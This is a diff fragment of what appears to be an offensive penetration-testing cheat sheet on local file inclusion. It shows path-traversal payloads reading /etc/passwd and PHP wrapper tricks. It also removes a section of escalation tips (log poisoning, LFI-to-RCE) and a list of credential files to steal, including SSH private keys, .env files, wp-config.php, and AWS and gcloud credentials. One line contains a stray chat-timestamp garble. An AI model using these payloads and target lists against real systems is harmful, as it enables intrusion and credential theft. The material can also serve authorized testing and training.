@@ -1110,27 +1110,3 @@ PUT ?page=../../../etc/passwd
 If no output, use time delays:
 ?page=/dev/random (hangs on Linux)
 ?page=php://filter/zlib.deflate/resource=/dev/random
-
-### 🧠 **What Others Miss**
-
-**Missed Opportunities:**
-- ✗Continue1:24 PMOnly testing GET parameters (miss POST, Cookie, Headers)
-
-✗ Stopping at /etc/passwd (miss config files, keys, logs)
-✗ Not attempting LFI2RCE escalation
-✗ Skipping Windows targets (assume Linux only)
-✗ Not testing ALL encoding combinations
-✗ Missing PHP wrappers (data://, php://filter, etc.)
-✗ Not poisoning logs for RCE
-✗ Ignoring error messages (reveal file paths)
-✗ Not reading application source code
-✗ Missing file upload + LFI combo
-
-Hidden Goldmines:
-
-Database config files: ../config/database.php, ../wp-config.php
-API keys: ../.env, ../config.json
-SSH keys: ~/.ssh/id_rsa, /root/.ssh/id_rsa
-Cloud credentials: ~/.aws/credentials, ~/.config/gcloud/credentials
-Source code: php://filter/convert.base64-encode/resource=index.php
-Logs with tokens: /var/log/apache2/access.log (search for session tokens)
